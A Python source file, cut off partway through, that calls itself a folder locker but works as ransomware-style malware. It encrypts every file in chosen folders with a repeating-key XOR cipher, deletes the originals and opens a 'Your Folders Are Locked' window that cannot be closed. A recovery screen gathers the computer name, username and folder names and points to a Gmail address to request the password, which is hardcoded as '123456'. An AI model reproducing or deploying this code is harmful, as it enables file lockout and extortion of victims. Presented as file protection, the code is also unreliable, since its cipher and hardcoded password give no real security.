"""
Folder Encryption & Locker System
- Encrypts real files in a folder
- Locks folder with password protection
- Shows GUI to unlock with password
- Forgot password option with email contact
"""

import os
import sys
import json
import base64
import hashlib
import shutil
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import webbrowser
from pathlib import Path
from datetime import datetime
import struct

# Configuration
SUPPORT_EMAIL = "choengrayu307@gmail.com"
MAX_ATTEMPTS = 3
MASTER_PASSWORD = "123456"
LOCK_FILE = ".folder_lock"
ENCRYPTED_EXTENSION = ".locked"


class FolderEncryptor:
    """Encrypts and decrypts folder contents using XOR cipher with password"""
    
    def __init__(self, password=MASTER_PASSWORD):
        self.password = password
        self.key = self._generate_key(password)
    
    def _generate_key(self, password):
        """Generate encryption key from password"""
        # Use SHA-256 to create a fixed-length key
        return hashlib.sha256(password.encode()).digest()
    
    def _xor_encrypt(self, data, key):
        """XOR encrypt/decrypt data with key"""
        result = bytearray()
        key_len = len(key)
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % key_len])
        return bytes(result)
    
    def encrypt_file(self, file_path):
        """Encrypt a single file"""
        try:
            # Read original file
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Store original filename in the encrypted file
            original_name = os.path.basename(file_path).encode('utf-8')
            name_length = len(original_name)
            
            # Create header: name_length (4 bytes) + original_name + data
            header = struct.pack('>I', name_length) + original_name
            full_data = header + original_data
            
            # Encrypt
            encrypted_data = self._xor_encrypt(full_data, self.key)
            
            # Write encrypted file
            encrypted_path = file_path + ENCRYPTED_EXTENSION
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Remove original file
            os.remove(file_path)
            
            return True
        except Exception as e:
            print(f"[-] Error encrypting {file_path}: {e}")
            return False
    
    def decrypt_file(self, encrypted_path):
        """Decrypt a single file"""
        try:
            # Read encrypted file
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            # Decrypt
            decrypted_data = self._xor_encrypt(encrypted_data, self.key)
            
            # Extract header
            name_length = struct.unpack('>I', decrypted_data[:4])[0]
            original_name = decrypted_data[4:4+name_length].decode('utf-8')
            original_data = decrypted_data[4+name_length:]
            
            # Write decrypted file
            folder = os.path.dirname(encrypted_path)
            original_path = os.path.join(folder, original_name)
            
            with open(original_path, 'wb') as f:
                f.write(original_data)
            
            # Remove encrypted file
            os.remove(encrypted_path)
            
            return True
        except Exception as e:
            print(f"[-] Error decrypting {encrypted_path}: {e}")
            return False
    
    def encrypt_folder(self, folder_path):
        """Encrypt all files in a folder"""
        folder_path = Path(folder_path)
        encrypted_count = 0
        file_list = []
        
        if not folder_path.exists():
            print(f"[-] Folder does not exist: {folder_path}")
            return 0
        
        print(f"[*] Encrypting folder: {folder_path}")
        
        # Collect all files first
        for root, dirs, files in os.walk(folder_path):
            # Skip hidden folders
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            
            for file in files:
                # Skip lock file and already encrypted files
                if file == LOCK_FILE or file.endswith(ENCRYPTED_EXTENSION):
                    continue
                
                file_path = os.path.join(root, file)
                file_list.append(file_path)
        
        # Encrypt each file
        for file_path in file_list:
            print(f"[*] Encrypting: {file_path}")
            if self.encrypt_file(file_path):
                encrypted_count += 1
                print(f"[+] Encrypted: {file_path}")
        
        # Create lock file
        lock_path = folder_path / LOCK_FILE
        lock_data = {
            'locked_at': datetime.now().isoformat(),
            'files_count': encrypted_count,
            'password_hash': hashlib.sha256(self.password.encode()).hexdigest()
        }
        with open(lock_path, 'w') as f:
            json.dump(lock_data, f)
        
        # Make lock file hidden on Windows
        try:
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 2)  # Hidden
        except:
            pass
        
        print(f"[+] Folder encrypted! {encrypted_count} files locked.")
        return encrypted_count
    
    def decrypt_folder(self, folder_path):
        """Decrypt all files in a folder"""
        folder_path = Path(folder_path)
        decrypted_count = 0
        
        if not folder_path.exists():
            raise FileNotFoundError(f"Folder does not exist: {folder_path}")
        
        print(f"[*] Decrypting folder: {folder_path}")
        
        # Find all encrypted files
        encrypted_files = []
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                if file.endswith(ENCRYPTED_EXTENSION):
                    encrypted_files.append(os.path.join(root, file))
        
        if not encrypted_files:
            print("[-] No encrypted files found")
            return 0
        
        # Decrypt each file
        for file_path in encrypted_files:
            print(f"[*] Decrypting: {file_path}")
            if self.decrypt_file(file_path):
                decrypted_count += 1
                print(f"[+] Decrypted: {file_path}")
        
        # Remove lock file
        lock_path = folder_path / LOCK_FILE
        if lock_path.exists():
            try:
                # Remove hidden attribute first
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 0)
            except:
                pass
            os.remove(lock_path)
        
        print(f"[+] Folder decrypted! {decrypted_count} files unlocked.")
        return decrypted_count
    
    def verify_password(self, folder_path, password):
        """Verify if password is correct for locked folder"""
        lock_path = Path(folder_path) / LOCK_FILE
        
        if not lock_path.exists():
            return False
        
        try:
            with open(lock_path, 'r') as f:
                lock_data = json.load(f)
            
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            return password_hash == lock_data.get('password_hash', '')
        except:
            return False
    
    def is_folder_locked(self, folder_path):
        """Check if folder is locked"""
        lock_path = Path(folder_path) / LOCK_FILE
        return lock_path.exists()


class FolderLockerGUI:
    """GUI for folder password prompt with forgot password functionality"""
    
    def __init__(self, folder_path, on_success_callback=None, auto_close=True):
        self.folder_path = folder_path
        self.on_success_callback = on_success_callback
        self.auto_close = auto_close
        self.encryptor = FolderEncryptor(MASTER_PASSWORD)
        self.attempts = 0
        self.max_attempts = MAX_ATTEMPTS
        self.unlocked = False
        self.lockout_time = 0  # Lockout timestamp in seconds
        self.lockout_duration = 600  # 10 minutes in seconds
        self.lockout_active = False
        
        # Create main window
        self.root = tk.Tk()
        self.root.title("🔒 Folder Locked")
        self.root.geometry("480x550")
        self.root.resizable(False, False)
        
        # Center window
        self.center_window()
        
        # Setup style
        self.setup_style()
        
        # Build UI
        self.build_ui()
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
    
    def center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = 480
        height = 550
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def setup_style(self):
        """Setup colors and styles"""
        self.bg_color = "#1e1e2e"
        self.fg_color = "#cdd6f4"
        self.accent_color = "#f38ba8"
        self.button_color = "#313244"
        self.success_color = "#a6e3a1"
        self.warning_color = "#f38ba8"
        self.entry_bg = "#45475a"
        
        self.root.configure(bg=self.bg_color)
    
    def build_ui(self):
        """Build the user interface"""
        # Main container
        main_frame = tk.Frame(self.root, bg=self.bg_color, padx=40, pady=25)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Lock icon
        icon_label = tk.Label(main_frame, text="🔐", font=("Segoe UI Emoji", 50),
                             bg=self.bg_color, fg=self.fg_color)
        icon_label.pack(pady=(0, 10))
        
        # Title
        title_label = tk.Label(main_frame, text="Folder is Locked",
                              font=("Segoe UI", 20, "bold"),
                              bg=self.bg_color, fg=self.fg_color)
        title_label.pack(pady=(0, 5))
        
        # Folder name
        folder_name = os.path.basename(self.folder_path)
        folder_label = tk.Label(main_frame, text=f"📁 {folder_name}",
                               font=("Segoe UI", 11),
                               bg=self.bg_color, fg="#888")
        folder_label.pack(pady=(0, 20))
        
        # Password frame
        pass_frame = tk.Frame(main_frame, bg=self.bg_color)
        pass_frame.pack(fill=tk.X, pady=(0, 10))
        
        pass_label = tk.Label(pass_frame, text="Enter Password:",
                             font=("Segoe UI", 11),
                             bg=self.bg_color, fg=self.fg_color)
        pass_label.pack(anchor=tk.W)
        
        # Password entry
        entry_container = tk.Frame(pass_frame, bg=self.entry_bg, highlightbackground=self.accent_color,
                                  highlightthickness=2)
        entry_container.pack(fill=tk.X, pady=(8, 0))
        
        self.password_var = tk.StringVar()
        self.password_entry = tk.Entry(entry_container, textvariable=self.password_var,
                                       font=("Segoe UI", 13), show="●",
                                       bg=self.entry_bg, fg=self.fg_color,
                                       insertbackground=self.fg_color,
                                       relief=tk.FLAT, bd=10)
        self.password_entry.pack(fill=tk.X, side=tk.LEFT, expand=True)
        self.password_entry.bind('<Return>', lambda e: self.unlock_folder())
        
        # Show/hide password
        self.show_pass = tk.BooleanVar(value=False)
        self.eye_btn = tk.Button(entry_container, text="👁", font=("Segoe UI", 12),
                                bg=self.entry_bg, fg=self.fg_color,
                                relief=tk.FLAT, bd=5, cursor="hand2",
                                command=self.toggle_password)
        self.eye_btn.pack(side=tk.RIGHT, padx=5)
        
        # Status label
        self.status_var = tk.StringVar()
        self.status_label = tk.Label(main_frame, textvariable=self.status_var,
                                    font=("Segoe UI", 10),
                                    bg=self.bg_color, fg=self.warning_color)
        self.status_label.pack(pady=(10, 5))
        
        # Attempts label
        self.attempts_var = tk.StringVar()
        self.update_attempts()
        self.attempts_label = tk.Label(main_frame, textvariable=self.attempts_var,
                                       font=("Segoe UI", 9),
                                       bg=self.bg_color, fg="#666")
        self.attempts_label.pack(pady=(0, 15))
        
        # Unlock button
        self.unlock_btn = tk.Button(main_frame, text="🔓 Unlock Folder",
                                   font=("Segoe UI", 13, "bold"),
                                   bg=self.accent_color, fg="white",
                                   activebackground="#f5a6bc",
                                   relief=tk.FLAT, pady=12, cursor="hand2",
                                   command=self.unlock_folder)
        self.unlock_btn.pack(fill=tk.X, pady=(0, 10))
        
        # Forgot password button (visible from start)
        self.forgot_btn = tk.Button(main_frame, text="🔑 Forgot Password?",
                                   font=("Segoe UI", 10),
                                   bg=self.button_color, fg="#89b4fa",
                                   activebackground="#45475a",
                                   relief=tk.FLAT, pady=8, cursor="hand2",
                                   command=self.show_forgot_password)
        self.forgot_btn.pack(fill=tk.X)  # Show immediately
        
        # Footer
        footer = tk.Label(main_frame, text="Contact support if you need help",
                         font=("Segoe UI", 9),
                         bg=self.bg_color, fg="#555")
        footer.pack(side=tk.BOTTOM, pady=(20, 0))
        
        # Focus password entry
        self.password_entry.focus_set()
    
    def toggle_password(self):
        """Toggle password visibility"""
        if self.show_pass.get():
            self.password_entry.config(show="●")
            self.eye_btn.config(text="👁")
            self.show_pass.set(False)
        else:
            self.password_entry.config(show="")
            self.eye_btn.config(text="🙈")
            self.show_pass.set(True)
    
    def update_attempts(self):
        """Update attempts display"""
        if self.lockout_active:
            import time
            remaining_time = int(self.lockout_time + self.lockout_duration - time.time())
            if remaining_time > 0:
                minutes = remaining_time // 60
                seconds = remaining_time % 60
                self.attempts_var.set(f"🔒 Locked for {minutes}m {seconds}s")
                # Schedule next update
                self.root.after(1000, self.update_attempts)
            else:
                # Lockout expired
                self.lockout_active = False
                self.attempts = 0
                self.update_attempts()
        else:
            remaining = self.max_attempts - self.attempts
            self.attempts_var.set(f"Attempts remaining: {remaining}")
    
    def unlock_folder(self):
        """Try to unlock the folder"""
        # Check if still in lockout
        if self.lockout_active:
            import time
            remaining_time = int(self.lockout_time + self.lockout_duration - time.time())
            if remaining_time > 0:
                self.status_var.set(f"⏳ Wait {remaining_time}s before trying again")
                return
            else:
                # Lockout expired
                self.lockout_active = False
                self.attempts = 0
                self.update_attempts()
        
        password = self.password_var.get()
        
        if not password:
            self.status_var.set("⚠ Please enter a password")
            return
        
        self.attempts += 1
        self.update_attempts()
        
        # Check if max attempts reached
        if self.attempts >= self.max_attempts:
            import time
            self.lockout_active = True
            self.lockout_time = time.time()
            self.update_attempts()
            self.max_attempts_reached()
            return
        
        # Disable button
        self.unlock_btn.config(state=tk.DISABLED, text="🔄 Unlocking...")
        self.root.update()
        
        # Check password
        self.root.after(300, lambda: self._verify_and_unlock(password))
    
    def _verify_and_unlock(self, password):
        """Verify password and unlock folder"""
        # Check if password is correct
        if password == MASTER_PASSWORD:
            self.status_var.set("✓ Password correct!")
            self.status_label.config(fg=self.success_color)
            self.unlock_btn.config(text="🔓 Decrypting...")
            self.root.update()
            
            try:
                # Create encryptor with correct password
                encryptor = FolderEncryptor(password)
                
                # Decrypt folder
                decrypted = encryptor.decrypt_folder(self.folder_path)
                
                if decrypted > 0:
                    self.unlocked = True
                    self.status_var.set(f"✓ Unlocked {decrypted} files!")
                    self.unlock_btn.config(text="✓ Success!")
                    
                    messagebox.showinfo("Success",
                                       f"Folder unlocked successfully!\n\n"
                                       f"📁 {self.folder_path}\n"
                                       f"📄 {decrypted} files decrypted")
                    
                    if self.on_success_callback:
                        self.on_success_callback()
                    
                    if self.auto_close:
                        self.root.destroy()
                else:
                    self.status_var.set("⚠ No encrypted files found")
                    self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock Folder")
                    
            except Exception as e:
                self.status_var.set(f"⚠ Error: {str(e)[:30]}")
                self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock Folder")
        else:
            # Wrong password
            self.status_var.set("✗ Wrong password!")
            self.status_label.config(fg=self.warning_color)
            self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock Folder")
            self.password_var.set("")
            self.password_entry.focus_set()
            
            # Max attempts reached
            if self.attempts >= self.max_attempts:
                self.max_attempts_reached()
    
    def max_attempts_reached(self):
        """Handle max attempts reached"""
        self.unlock_btn.config(state=tk.DISABLED)
        self.password_entry.config(state=tk.DISABLED)
        self.status_var.set("🚫 Too many attempts!")
        
        messagebox.showwarning("Locked Out",
                              f"Maximum attempts ({self.max_attempts}) exceeded!\n\n"
                              f"Please contact support:\n{SUPPORT_EMAIL}")
        
        self.show_forgot_password()
    
    def show_forgot_password(self):
        """Show forgot password window"""
        forgot = tk.Toplevel(self.root)
        forgot.title("🔑 Password Recovery")
        forgot.geometry("420x400")
        forgot.resizable(False, False)
        forgot.configure(bg=self.bg_color)
        forgot.transient(self.root)
        forgot.grab_set()
        
        # Center
        forgot.geometry(f"+{self.root.winfo_x()+30}+{self.root.winfo_y()+30}")
        
        # Content
        frame = tk.Frame(forgot, bg=self.bg_color, padx=30, pady=25)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Icon
        tk.Label(frame, text="📧", font=("Segoe UI Emoji", 40),
                bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
        
        # Title
        tk.Label(frame, text="Password Recovery",
                font=("Segoe UI", 16, "bold"),
                bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
        
        # Instructions
        tk.Label(frame, text="Send an email to request your password:",
                font=("Segoe UI", 10),
                bg=self.bg_color, fg="#888").pack(pady=(0, 15))
        
        # Info box
        info_frame = tk.Frame(frame, bg=self.button_color, padx=15, pady=15)
        info_frame.pack(fill=tk.X, pady=(0, 15))
        
        import platform
        computer = platform.node()
        user = os.getenv('USERNAME', 'Unknown')
        folder = os.path.basename(self.folder_path)
        
        info_text = f"""Computer: {computer}
User: {user}
Folder: {folder}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}"""
        
        tk.Label(info_frame, text=info_text, font=("Consolas", 9),
                bg=self.button_color, fg=self.fg_color,
                justify=tk.LEFT).pack(anchor=tk.W)
        
        # Email button
        email_btn = tk.Button(frame, text=f"📧 Email: {SUPPORT_EMAIL}",
                             font=("Segoe UI", 11, "bold"),
                             bg=self.accent_color, fg="white",
                             relief=tk.FLAT, pady=10, cursor="hand2",
                             command=lambda: self.send_email(forgot))
        email_btn.pack(fill=tk.X, pady=(0, 10))
        
        # Copy button
        copy_btn = tk.Button(frame, text="📋 Copy Email Address",
                            font=("Segoe UI", 10),
                            bg=self.button_color, fg=self.fg_color,
                            relief=tk.FLAT, pady=8, cursor="hand2",
                            command=lambda: self.copy_email(forgot))
        copy_btn.pack(fill=tk.X, pady=(0, 10))
        
        # Close button
        tk.Button(frame, text="Close", font=("Segoe UI", 10),
                 bg="#45475a", fg=self.fg_color,
                 relief=tk.FLAT, pady=8,
                 command=forgot.destroy).pack(fill=tk.X)
    
    def send_email(self, parent=None):
        """Open email client"""
        import urllib.parse
        import platform
        
        subject = "Password Recovery Request"
        body = f"""Hello,

I need to recover my folder password.

Computer: {platform.node()}
User: {os.getenv('USERNAME', 'Unknown')}
Folder: {self.folder_path}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Please send me the password.

Thank you."""
        
        mailto = f"mailto:{SUPPORT_EMAIL}?subject={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"
        
        try:
            webbrowser.open(mailto)
            if parent:
                messagebox.showinfo("Email", "Email client opened!\nPlease send the email.", parent=parent)
        except:
            messagebox.showerror("Error", f"Could not open email client.\nPlease email: {SUPPORT_EMAIL}", parent=parent)
    
    def copy_email(self, parent=None):
        """Copy email to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(SUPPORT_EMAIL)
        messagebox.showinfo("Copied", f"Email copied:\n{SUPPORT_EMAIL}", parent=parent)
    
    def on_close(self):
        """Handle window close - prevent closing without unlocking"""
        if not self.unlocked:
            messagebox.showwarning("Cannot Close", 
                                  "🔒 You must enter the correct password to unlock your files!\n\n"
                                  "Your files will remain encrypted until you enter the password.\n\n"
                                  "Click 'Forgot Password?' if you need help.")
            # Don't destroy - keep window open
            return
        else:
            self.root.destroy()
    
    def run(self):
        """Run the GUI"""
        self.root.mainloop()
        return self.unlocked


class MultiFolderLockerGUI:
    """GUI for unlocking multiple folders with password"""
    
    def __init__(self, folder_paths, on_success_callback=None, auto_close=True):
        self.folder_paths = folder_paths  # List of folder paths
        self.on_success_callback = on_success_callback
        self.auto_close = auto_close
        self.encryptor = FolderEncryptor(MASTER_PASSWORD)
        self.attempts = 0
        self.max_attempts = MAX_ATTEMPTS
        self.unlocked = False
        self.lockout_time = 0  # Lockout timestamp in seconds
        self.lockout_duration = 600  # 10 minutes in seconds
        self.lockout_active = False
        
        # Create main window
        self.root = tk.Tk()
        self.root.title("🔒 Folders Locked")
        self.root.geometry("500x600")
        self.root.resizable(False, False)
        
        # Center window
        self.center_window()
        
        # Setup style
        self.setup_style()
        
        # Build UI
        self.build_ui()
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
    
    def center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = 500
        height = 600
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f'{width}x{height}+{x}+{y}')
    
    def setup_style(self):
        """Setup colors and styles"""
        self.bg_color = "#1e1e2e"
        self.fg_color = "#cdd6f4"
        self.accent_color = "#f38ba8"
        self.button_color = "#313244"
        self.success_color = "#a6e3a1"
        self.warning_color = "#f38ba8"
        self.entry_bg = "#45475a"
        
        self.root.configure(bg=self.bg_color)
    
    def build_ui(self):
        """Build the user interface"""
        # Main container
        main_frame = tk.Frame(self.root, bg=self.bg_color, padx=40, pady=20)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Lock icon
        icon_label = tk.Label(main_frame, text="🔐", font=("Segoe UI Emoji", 45),
                             bg=self.bg_color, fg=self.fg_color)
        icon_label.pack(pady=(0, 8))
        
        # Title
        title_label = tk.Label(main_frame, text="Your Folders Are Locked",
                              font=("Segoe UI", 18, "bold"),
                              bg=self.bg_color, fg=self.fg_color)
        title_label.pack(pady=(0, 5))
        
        # Subtitle
        subtitle = tk.Label(main_frame, text="Enter password to unlock your files",
                           font=("Segoe UI", 10),
                           bg=self.bg_color, fg="#888")
        subtitle.pack(pady=(0, 15))
        
        # Locked folders list
        folders_frame = tk.Frame(main_frame, bg=self.button_color, padx=15, pady=10)
        folders_frame.pack(fill=tk.X, pady=(0, 15))
        
        tk.Label(folders_frame, text="📁 Locked Folders:",
                font=("Segoe UI", 10, "bold"),
                bg=self.button_color, fg=self.fg_color).pack(anchor=tk.W)
        
        for folder in self.folder_paths:
            folder_name = os.path.basename(folder)
            tk.Label(folders_frame, text=f"   • {folder_name}",
                    font=("Segoe UI", 10),
                    bg=self.button_color, fg="#89b4fa").pack(anchor=tk.W)
        
        # Password frame
        pass_frame = tk.Frame(main_frame, bg=self.bg_color)
        pass_frame.pack(fill=tk.X, pady=(0, 10))
        
        pass_label = tk.Label(pass_frame, text="Enter Password:",
                             font=("Segoe UI", 11),
                             bg=self.bg_color, fg=self.fg_color)
        pass_label.pack(anchor=tk.W)
        
        # Password entry
        entry_container = tk.Frame(pass_frame, bg=self.entry_bg, highlightbackground=self.accent_color,
                                  highlightthickness=2)
        entry_container.pack(fill=tk.X, pady=(8, 0))
        
        self.password_var = tk.StringVar()
        self.password_entry = tk.Entry(entry_container, textvariable=self.password_var,
                                       font=("Segoe UI", 13), show="●",
                                       bg=self.entry_bg, fg=self.fg_color,
                                       insertbackground=self.fg_color,
                                       relief=tk.FLAT, bd=10)
        self.password_entry.pack(fill=tk.X, side=tk.LEFT, expand=True)
        self.password_entry.bind('<Return>', lambda e: self.unlock_folders())
        
        # Show/hide password
        self.show_pass = tk.BooleanVar(value=False)
        self.eye_btn = tk.Button(entry_container, text="👁", font=("Segoe UI", 12),
                                bg=self.entry_bg, fg=self.fg_color,
                                relief=tk.FLAT, bd=5, cursor="hand2",
                                command=self.toggle_password)
        self.eye_btn.pack(side=tk.RIGHT, padx=5)
        
        # Status label
        self.status_var = tk.StringVar()
        self.status_label = tk.Label(main_frame, textvariable=self.status_var,
                                    font=("Segoe UI", 10),
                                    bg=self.bg_color, fg=self.warning_color)
        self.status_label.pack(pady=(10, 5))
        
        # Attempts label
        self.attempts_var = tk.StringVar()
        self.update_attempts()
        self.attempts_label = tk.Label(main_frame, textvariable=self.attempts_var,
                                       font=("Segoe UI", 9),
                                       bg=self.bg_color, fg="#666")
        self.attempts_label.pack(pady=(0, 12))
        
        # Unlock button
        self.unlock_btn = tk.Button(main_frame, text="🔓 Unlock All Folders",
                                   font=("Segoe UI", 13, "bold"),
                                   bg=self.accent_color, fg="white",
                                   activebackground="#f5a6bc",
                                   relief=tk.FLAT, pady=12, cursor="hand2",
                                   command=self.unlock_folders)
        self.unlock_btn.pack(fill=tk.X, pady=(0, 10))
        
        # Forgot password button (visible from start)
        self.forgot_btn = tk.Button(main_frame, text="🔑 Forgot Password?",
                                   font=("Segoe UI", 10),
                                   bg=self.button_color, fg="#89b4fa",
                                   activebackground="#45475a",
                                   relief=tk.FLAT, pady=8, cursor="hand2",
                                   command=self.show_forgot_password)
        self.forgot_btn.pack(fill=tk.X)  # Show immediately
        
        # Footer
        footer = tk.Label(main_frame, text="Contact support if you need help",
                         font=("Segoe UI", 9),
                         bg=self.bg_color, fg="#555")
        footer.pack(side=tk.BOTTOM, pady=(15, 0))
        
        # Focus password entry
        self.password_entry.focus_set()
    
    def toggle_password(self):
        """Toggle password visibility"""
        if self.show_pass.get():
            self.password_entry.config(show="●")
            self.eye_btn.config(text="👁")
            self.show_pass.set(False)
        else:
            self.password_entry.config(show="")
            self.eye_btn.config(text="🙈")
            self.show_pass.set(True)
    
    def update_attempts(self):
        """Update attempts display"""
        if self.lockout_active:
            import time
            remaining_time = int(self.lockout_time + self.lockout_duration - time.time())
            if remaining_time > 0:
                minutes = remaining_time // 60
                seconds = remaining_time % 60
                self.attempts_var.set(f"🔒 Locked for {minutes}m {seconds}s")
                # Schedule next update
                self.root.after(1000, self.update_attempts)
            else:
                # Lockout expired
                self.lockout_active = False
                self.attempts = 0
                self.update_attempts()
        else:
            remaining = self.max_attempts - self.attempts
            self.attempts_var.set(f"Attempts remaining: {remaining}")
    
    def unlock_folders(self):
        """Try to unlock all folders"""
        # Check if still in lockout
        if self.lockout_active:
            import time
            remaining_time = int(self.lockout_time + self.lockout_duration - time.time())
            if remaining_time > 0:
                self.status_var.set(f"⏳ Wait {remaining_time}s before trying again")
                return
            else:
                # Lockout expired
                self.lockout_active = False
                self.attempts = 0
                self.update_attempts()
        
        password = self.password_var.get()
        
        if not password:
            self.status_var.set("⚠ Please enter a password")
            return
        
        self.attempts += 1
        self.update_attempts()
        
        # Check if max attempts reached
        if self.attempts >= self.max_attempts:
            import time
            self.lockout_active = True
            self.lockout_time = time.time()
            self.update_attempts()
            self.max_attempts_reached()
            return
        
        # Disable button
        self.unlock_btn.config(state=tk.DISABLED, text="🔄 Unlocking...")
        self.root.update()
        
        # Check password
        self.root.after(300, lambda: self._verify_and_unlock(password))
    
    def _verify_and_unlock(self, password):
        """Verify password and unlock all folders"""
        # Check if password is correct
        if password == MASTER_PASSWORD:
            self.status_var.set("✓ Password correct!")
            self.status_label.config(fg=self.success_color)
            self.unlock_btn.config(text="🔓 Decrypting...")
            self.root.update()
            
            try:
                # Create encryptor with correct password
                encryptor = FolderEncryptor(password)
                
                # Decrypt all folders
                total_decrypted = 0
                for folder_path in self.folder_paths:
                    try:
                        decrypted = encryptor.decrypt_folder(folder_path)
                        total_decrypted += decrypted
                    except Exception as e:
                        print(f"[-] Error decrypting {folder_path}: {e}")
                
                if total_decrypted > 0:
                    self.unlocked = True
                    self.status_var.set(f"✓ Unlocked {total_decrypted} files!")
                    self.unlock_btn.config(text="✓ Success!")
                    
                    folder_names = ", ".join([os.path.basename(f) for f in self.folder_paths])
                    messagebox.showinfo("Success",
                                       f"Folders unlocked successfully!\n\n"
                                       f"📁 {folder_names}\n"
                                       f"📄 {total_decrypted} files decrypted")
                    
                    if self.on_success_callback:
                        self.on_success_callback()
                    
                    if self.auto_close:
                        self.root.destroy()
                else:
                    self.status_var.set("⚠ No encrypted files found")
                    self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock All Folders")
                    
            except Exception as e:
                self.status_var.set(f"⚠ Error: {str(e)[:30]}")
                self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock All Folders")
        else:
            # Wrong password
            self.status_var.set("✗ Wrong password!")
            self.status_label.config(fg=self.warning_color)
            self.unlock_btn.config(state=tk.NORMAL, text="🔓 Unlock All Folders")
            self.password_var.set("")
            self.password_entry.focus_set()
            
            # Max attempts reached
            
            # Max attempts reached
            if self.attempts >= self.max_attempts:
                self.max_attempts_reached()
    
    def max_attempts_reached(self):
        """Handle max attempts reached"""
        self.unlock_btn.config(state=tk.DISABLED)
        self.password_entry.config(state=tk.DISABLED)
        self.status_var.set("🚫 Too many attempts!")
        
        messagebox.showwarning("Locked Out",
                              f"Maximum attempts ({self.max_attempts}) exceeded!\n\n"
                              f"Please contact support:\n{SUPPORT_EMAIL}")
        
        self.show_forgot_password()
    
    def show_forgot_password(self):
        """Show forgot password window"""
        forgot = tk.Toplevel(self.root)
        forgot.title("🔑 Password Recovery")
        forgot.geometry("420x420")
        forgot.resizable(False, False)
        forgot.configure(bg=self.bg_color)
        forgot.transient(self.root)
        forgot.grab_set()
        
        # Center
        forgot.geometry(f"+{self.root.winfo_x()+40}+{self.root.winfo_y()+50}")
        
        # Content
        frame = tk.Frame(forgot, bg=self.bg_color, padx=30, pady=25)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # Icon
        tk.Label(frame, text="📧", font=("Segoe UI Emoji", 40),
                bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
        
        # Title
        tk.Label(frame, text="Password Recovery",
                font=("Segoe UI", 16, "bold"),
                bg=self.bg_color, fg=self.fg_color).pack(pady=(0, 10))
        
        # Instructions
        tk.Label(frame, text="Send an email to request your password:",
                font=("Segoe UI", 10),
                bg=self.bg_color, fg="#888").pack(pady=(0, 15))
        
        # Info box
        info_frame = tk.Frame(frame, bg=self.button_color, padx=15, pady=15)
        info_frame.pack(fill=tk.X, pady=(0, 15))
        
        import platform
        computer = platform.node()
        user = os.getenv('USERNAME', 'Unknown')
        folders = ", ".join([os.path.basename(f) for f in self.folder_paths])
        
        info_text = f"""Computer: {computer}
User: {user}
Folders: {folders}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}"""
        
        tk.Label(info_frame, text=info_text, font=("Consolas", 9),
                bg=self.button_color, fg=self.fg_color,
                justify=tk.LEFT).pack(anchor=tk.W)
        
        # Email button
        email_btn = tk.Button(frame, text=f"📧 Email: {SUPPORT_EMAIL}",
                             font=("Segoe UI", 11, "bold"),
                             bg=self.accent_color, fg="white",
                             relief=tk.FLAT, pady=10, cursor="hand2",
                             command=lambda: self.send_email(forgot))
        email_btn.pack(fill=tk.X, pady=(0, 10))
        
        # Copy button
        copy_btn = tk.Button(frame, text="📋 Copy Email Address",
                            font=("Segoe UI", 10),
                            bg=self.button_color, fg=self.fg_color,
                            relief=tk.FLAT, pady=8, cursor="hand2",
                            command=lambda: self.copy_email(forgot))
        copy_btn.pack(fill=tk.X, pady=(0, 10))
        
        # Close button
        tk.Button(frame, text="Close", font=("Segoe UI", 10),
                 bg="#45475a", fg=self.fg_color,
                 relief=tk.FLAT, pady=8,
                 command=forgot.destroy).pack(fill=tk.X)
    
    def send_email(self, parent=None):
        """Open email client"""
        import urllib.parse
        import platform
        
        folders = ", ".join([os.path.basename(f) for f in self.folder_paths])
        
        subject = "Password Recovery Request"
        body = f"""Hello,

I need to recover my folder password.

Computer: {platform.node()}
User: {os.getenv('USERNAME', 'Unknown')}
Folders: {folders}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Please send me the password.

Thank you."""
        
        mailto = f"mailto:{SUPPORT_EMAIL}?subject={urllib.parse.quote(subject)}&body={urllib.parse.quote(body)}"
        
        try:
            webbrowser.open(mailto)
            if parent:
                messagebox.showinfo("Email", "Email client opened!\nPlease send the email.", parent=parent)
        except:
            messagebox.showerror("Error", f"Could not open email client.\nPlease email: {SUPPORT_EMAIL}", parent=parent)
    
    def copy_email(self, parent=None):
        """Copy email to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(SUPPORT_EMAIL)
        messagebox.showinfo("Copied", f"Email copied:\n{SUPPORT_EMAIL}", parent=parent)
    
    def on_close(self):
        """Handle window close - prevent closing without unlocking"""
